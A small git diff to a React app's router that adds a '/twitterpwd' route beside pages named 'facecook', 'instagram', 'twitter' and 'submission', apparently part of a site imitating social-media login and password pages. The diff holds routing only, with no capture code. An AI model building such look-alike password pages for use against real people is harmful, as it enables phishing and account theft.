@@ -9,6 +9,7 @@ import Home from "./pages/Home";
 import Login from "./pages/Login";
 import Instagram from "./pages/Instagram";
 import Twitter from "./pages/Twitter";
+import TwitterPwd from "./pages/TwitterPwd";
 
 import { BrowserRouter, Routes, Route } from "react-router-dom";
 
@@ -26,6 +27,7 @@ function App() {
           <Route path="/facecook" element={<Facecook />} />
           <Route path="/instagram" element={<Instagram />} />
           <Route path="/twitter" element={<Twitter />} />
+          <Route path="/twitterpwd" element={<TwitterPwd />} />
           <Route path="/submission" element={<Submission />} />
           <Route path="/" element={<Home />} />
         </Routes>
